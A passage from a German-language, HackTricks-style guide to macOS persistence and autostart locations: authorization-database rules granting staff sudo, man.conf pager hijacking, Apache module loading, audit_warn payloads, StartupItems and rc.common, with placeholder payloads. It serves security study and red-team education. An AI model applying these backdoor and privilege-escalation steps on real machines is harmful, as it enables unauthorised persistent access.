Füge schließlich die **rule** zum Laden dieses Plugins hinzu:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Die **`evaluate-mechanisms`**-Direktive teilt dem Autorisierungs-Framework mit, dass es **einen externen Mechanismus zur Autorisierung aufrufen muss**. Außerdem sorgt **`privileged`** dafür, dass dieser als Root ausgeführt wird.

Löse es aus mit:
```bash
security authorize com.asdf.asdf
```
Und dann sollte die **staff-Gruppe sudo**-Zugriff haben (lese `/etc/sudoers`, um dies zu bestätigen).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Nützlich zum Umgehen der sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Dafür musst du jedoch root sein und der Benutzer muss man verwenden
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`/private/etc/man.conf`**
- Root erforderlich
- **`/private/etc/man.conf`**: Wird immer verwendet, wenn man aufgerufen wird

#### Beschreibung & Exploit

Die Konfigurationsdatei **`/private/etc/man.conf`** gibt das Binary/Script an, das beim Öffnen von man-Dokumentationsdateien verwendet wird. Daher könnte der Pfad zur ausführbaren Datei geändert werden, sodass jedes Mal, wenn der Benutzer man zum Lesen einer Dokumentation verwendet, eine backdoor ausgeführt wird.

Zum Beispiel in **`/private/etc/man.conf`** festlegen:
```
MANPAGER /tmp/view
```
Und erstellen Sie dann `/tmp/view` wie folgt:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Nützlich zum Umgehen der sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Dafür musst du jedoch root sein und Apache muss ausgeführt werden
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd verfügt über keine entitlements

#### Ort

- **`/etc/apache2/httpd.conf`**
- Root erforderlich
- Auslöser: Wenn Apache2 gestartet wird

#### Beschreibung & Exploit

Du kannst in `/etc/apache2/httpd.conf` angeben, dass ein Modul geladen werden soll, indem du eine Zeile wie die folgende hinzufügst:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Auf diese Weise wird dein kompiliertes Modul von Apache geladen. Das Einzige ist, dass du es entweder mit einem **gültigen Apple-Zertifikat signieren** oder ein **neues vertrauenswürdiges Zertifikat** zum System hinzufügen und es damit **signieren** musst.

Falls erforderlich, kannst du anschließend Folgendes ausführen, um sicherzustellen, dass der Server gestartet wird:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Codebeispiel für die Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM-Audit-Framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Nützlich, um die sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
- Dafür musst du root sein, auditd muss laufen und eine Warnung auslösen
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

- **`/etc/security/audit_warn`**
- root erforderlich
- **Auslöser**: Wenn auditd eine Warnung erkennt

#### Beschreibung & Exploit

Immer wenn auditd eine Warnung erkennt, wird das Script **`/etc/security/audit_warn`** **ausgeführt**. Du könntest daher deine Payload darin hinzufügen.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
You could force a warning with `sudo audit -n`.

### Startup Items

> [!CAUTION] > **Dies ist veraltet, daher sollte in diesen Verzeichnissen nichts gefunden werden.**

Das **StartupItem** ist ein Verzeichnis, das sich entweder unter `/Library/StartupItems/` oder `/System/Library/StartupItems/` befinden sollte. Sobald dieses Verzeichnis eingerichtet ist, muss es zwei bestimmte Dateien enthalten:

1. Ein **rc-Script**: Ein Shell-Script, das beim Start ausgeführt wird.
2. Eine **plist-Datei** mit dem Namen `StartupParameters.plist`, die verschiedene Konfigurationseinstellungen enthält.

Stelle sicher, dass sowohl das rc-Script als auch die Datei `StartupParameters.plist` korrekt im Verzeichnis **StartupItem** platziert sind, damit der Startvorgang sie erkennen und verwenden kann.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Ich kann diese Komponente in meinem macOS nicht finden. Weitere Informationen finden Sie daher im Writeup.

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

**emond** wurde von Apple eingeführt und ist ein Logging-Mechanismus, der unterentwickelt oder möglicherweise aufgegeben zu sein scheint, aber weiterhin zugänglich ist. Dieser obskure Service bietet einem Mac-Administrator zwar keinen besonderen Nutzen, könnte jedoch als unauffällige Persistence-Methode für Threat Actors dienen und würde wahrscheinlich von den meisten macOS-Administratoren unbemerkt bleiben.

Für diejenigen, die von seiner Existenz wissen, ist das Erkennen einer bösartigen Verwendung von **emond** unkompliziert. Der systemeigene LaunchDaemon für diesen Service sucht in einem einzigen Verzeichnis nach auszuführenden Scripts. Zur Überprüfung kann der folgende Befehl verwendet werden:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Speicherort

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root erforderlich
- **Trigger**: Mit XQuartz

#### Beschreibung & Exploit

XQuartz ist in **macOS nicht mehr installiert**, daher findest du weitere Informationen im Writeup.

### ~~kext~~

> [!CAUTION]
> Die Installation eines kext ist selbst als Root so kompliziert, dass ich dies nicht als Möglichkeit zum Entkommen aus Sandboxes oder auch für Persistence in Betracht ziehen würde (es sei denn, du hast einen Exploit).

#### Speicherort

Um ein KEXT als Autostart-Element zu installieren, muss es an einem der folgenden Speicherorte **installiert** werden:

- `/System/Library/Extensions`
- In das Betriebssystem OS X integrierte KEXT-Dateien.
- `/Library/Extensions`
- Von Drittanbieter-Software installierte KEXT-Dateien

Du kannst aktuell geladene kext-Dateien mit folgendem Befehl auflisten:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Weitere Informationen zu [**Kernel Extensions findest du in diesem Abschnitt**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Speicherort

- **`/usr/local/bin/amstoold`**
- Root erforderlich

#### Beschreibung & Exploitation

Anscheinend verwendete die `plist` aus `/System/Library/LaunchAgents/com.apple.amstoold.plist` diese Binary, während sie einen XPC-Service bereitstellte ... das Problem war, dass die Binary nicht existierte. Du konntest also dort etwas platzieren, und sobald der XPC-Service aufgerufen wurde, wäre deine Binary aufgerufen worden.

Ich kann dies in meinem macOS nicht mehr finden.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Speicherort

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root erforderlich
- **Trigger**: Wenn der Service ausgeführt wird (selten)

#### Beschreibung & Exploit

Anscheinend wird dieses Script nicht sehr häufig ausgeführt, und ich konnte es nicht einmal in meinem macOS finden. Wenn du also weitere Informationen möchtest, sieh dir den Writeup an.

### ~~/etc/rc.common~~

> [!CAUTION] > **Dies funktioniert in modernen macOS-Versionen nicht**

Es ist ebenfalls möglich, hier **Befehle zu platzieren, die beim Start ausgeführt werden.** Beispiel für ein reguläres rc.common-Script:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistence-Techniken und Tools

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## Referenzen

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
